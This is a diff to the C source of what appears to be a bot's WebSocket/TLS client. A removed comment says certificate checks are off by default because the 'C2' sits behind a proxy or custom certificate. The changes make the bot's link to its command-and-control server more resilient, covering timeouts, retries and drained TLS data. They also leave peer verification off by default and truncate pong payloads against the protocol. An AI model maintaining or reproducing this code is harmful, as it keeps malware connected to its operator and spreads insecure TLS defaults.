@@ -1,6 +1,6 @@
 #include "bot.h"
 
-/* Pull bytes from leftover buffer first, then socket/SSL */
+/* Pull leftover first, then SSL/socket. Never treat SO_RCVTIMEO as hard close. */
 static int io_read(WS *ws, void *buf, int need)
 {
     unsigned char *p = (unsigned char *)buf;
@@ -23,36 +23,51 @@ static int io_read(WS *ws, void *buf, int need)
         n = (int)recv(ws->sockfd, p + got, (size_t)want, 0);
 
     if (n > 0) return got + n;
-    if (n == 0) return got > 0 ? got : -1;
+
+    /* n==0: with SO_RCVTIMEO this is often TIMEOUT not peer close.
+     * Only treat as peer close if poll shows HUP/ERR or no timeout configured. */
+    if (n == 0) {
+        if (got > 0) return got;
+        struct pollfd pfd = { .fd = ws->sockfd, .events = POLLIN };
+        int pr = poll(&pfd, 1, 0);
+        if (pr > 0 && (pfd.revents & (POLLHUP | POLLERR | POLLNVAL)))
+            return -1;
+        /* Idle / timeout — not a hard error */
+        return 0;
+    }
 
     if (ws->use_ssl) {
         int e = SSL_get_error(ws->ssl, n);
         if (e == SSL_ERROR_WANT_READ || e == SSL_ERROR_WANT_WRITE)
-            return got; /* wouldblock / SO_RCVTIMEO */
-        if (e == SSL_ERROR_ZERO_RETURN)
-            return got > 0 ? got : -1; /* clean TLS close */
+            return got;
+        if (e == SSL_ERROR_ZERO_RETURN) {
+            if (got > 0) return got;
+            return -1;
+        }
         if (e == SSL_ERROR_SYSCALL) {
-            /* Timeout or interrupt: errno may be EAGAIN/ETIMEDOUT or 0 (OpenSSL quirk) */
-            if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR ||
+            if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR || errno == 0
 #ifdef ETIMEDOUT
-                errno == ETIMEDOUT ||
+                || errno == ETIMEDOUT
 #endif
-                errno == 0)
+            )
                 return got;
             return -1;
         }
+        /* Other SSL errors: treat empty as idle once, not instant death */
+        if (got == 0 && (errno == 0 || errno == EAGAIN || errno == EWOULDBLOCK))
+            return 0;
         return -1;
     }
-    if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR
+    if (errno == EAGAIN || errno == EWOULDBLOCK || errno == EINTR || errno == 0
 #ifdef ETIMEDOUT
         || errno == ETIMEDOUT
 #endif
-        || errno == 0)
+    )
         return got;
     return -1;
 }
 
-/* return 1 ok, 0 idle timeout, -1 hard error */
+/* return 1 ok, 0 idle, -1 hard */
 static int read_exact(WS *ws, void *buf, int need)
 {
     unsigned char *p = (unsigned char *)buf;
@@ -65,7 +80,7 @@ static int read_exact(WS *ws, void *buf, int need)
         if (n == 0) {
             if (got == 0) return 0;
             empty_rounds++;
-            if (empty_rounds > 20) return -1;
+            if (empty_rounds > 40) return -1; /* ~2s stuck mid-frame */
             usleep(50000);
             continue;
         }
@@ -85,11 +100,10 @@ static void stash_leftover(WS *ws, const char *data, int total, int hdr_end)
     ws->rbuf_off = 0;
 }
 
-/* Drain any pending TLS app data into rbuf (non-blocking-ish) */
 static void drain_ssl_pending(WS *ws)
 {
     if (!ws->use_ssl || !ws->ssl) return;
-    for (;;) {
+    for (int i = 0; i < 32; i++) {
         if (ws->rbuf_len >= (int)sizeof(ws->rbuf)) break;
         int space = (int)sizeof(ws->rbuf) - ws->rbuf_len;
         int n = SSL_read(ws->ssl, ws->rbuf + ws->rbuf_len, space);
@@ -101,7 +115,6 @@ static void drain_ssl_pending(WS *ws)
     }
 }
 
-/* Base64 encode (for Sec-WebSocket-Key, typically 16 bytes → 24 chars) */
 static void b64_encode(const unsigned char *in, int inlen, char *out, int outcap)
 {
     static const char *t =
@@ -184,7 +197,6 @@ int ws_connect(WS *ws, const char *bot_id)
             close(ws->sockfd); ws->sockfd = -1;
             return -1;
         }
-        /* Default: no verify (C2 often behind CF / custom cert). BOT_VERIFY=1 enables peer check. */
         {
             const char *ver = getenv("BOT_VERIFY");
             int verify = (ver && (ver[0] == '1' || ver[0] == 'y' || ver[0] == 'Y'));
@@ -205,7 +217,7 @@ int ws_connect(WS *ws, const char *bot_id)
         }
         SSL_set_tlsext_host_name(ws->ssl, ws->host);
         SSL_set_fd(ws->ssl, ws->sockfd);
-        SSL_set_mode(ws->ssl, SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);
+        SSL_set_mode(ws->ssl, SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER | SSL_MODE_AUTO_RETRY);
 
         if (SSL_connect(ws->ssl) != 1) {
             SSL_free(ws->ssl); ws->ssl = NULL;
@@ -228,7 +240,6 @@ int ws_connect(WS *ws, const char *bot_id)
         }
     }
 
-    /* Random Sec-WebSocket-Key (RFC 6455) */
     unsigned char key_raw[16];
     FILE *ur = fopen("/dev/urandom", "r");
     if (ur) {
@@ -307,10 +318,10 @@ int ws_connect(WS *ws, const char *bot_id)
     }
 
     stash_leftover(ws, resp, total, hdr_end);
-    /* Drain any more app data already in TLS (e.g. server "connected" frame) */
     drain_ssl_pending(ws);
 
-    struct timeval tv2 = {10, 0};
+    /* Shorter poll for main loop; idle returns 0 not hard error */
+    struct timeval tv2 = {5, 0};
     setsockopt(ws->sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv2, sizeof(tv2));
     struct timeval tvs = {15, 0};
     setsockopt(ws->sockfd, SOL_SOCKET, SO_SNDTIMEO, &tvs, sizeof(tvs));
@@ -416,7 +427,6 @@ int ws_send(WS *ws, const char *msg)
     return r;
 }
 
-/* Returns: >0 bytes, 0 idle/timeout, -1 hard disconnect */
 int ws_recv(WS *ws, char *buf, int cap)
 {
     if (ws->sockfd < 0) return -1;
@@ -477,20 +487,15 @@ int ws_recv(WS *ws, char *buf, int cap)
             unsigned char pong[14];
             int ph = 2;
             pong[0] = 0x8A;
-            if (plen <= 125) {
-                pong[1] = (unsigned char)(0x80 | (unsigned)plen);
-            } else {
-                free(py);
-                pthread_mutex_unlock(&ws->io);
-                return -1;
-            }
+            if (plen > 8) plen = 0;
+            pong[1] = (unsigned char)(0x80 | (unsigned)plen);
             unsigned char m[4];
             FILE *ur2 = fopen("/dev/urandom", "r");
             if (ur2) { fread(m, 1, 4, ur2); fclose(ur2); }
             else { memset(m, 0xab, 4); }
             memcpy(pong + ph, m, 4);
             ph += 4;
-            for (uint64_t i = 0; i < plen && i < 8; i++)
+            for (uint64_t i = 0; i < plen; i++)
                 pong[ph + (int)i] = py[i] ^ m[i % 4];
             ph += (int)plen;
             if (ws->use_ssl)
@@ -511,11 +516,9 @@ int ws_recv(WS *ws, char *buf, int cap)
             pthread_mutex_unlock(&ws->io);
             return 0;
         }
-        /* text / binary only; drop continuation / reserved opcodes safely */
         if (op != 0x1 && op != 0x2) {
             free(py);
             pthread_mutex_unlock(&ws->io);
-            if (op == 0x0) continue; /* continuation without buffer — skip */
             continue;
         }
 
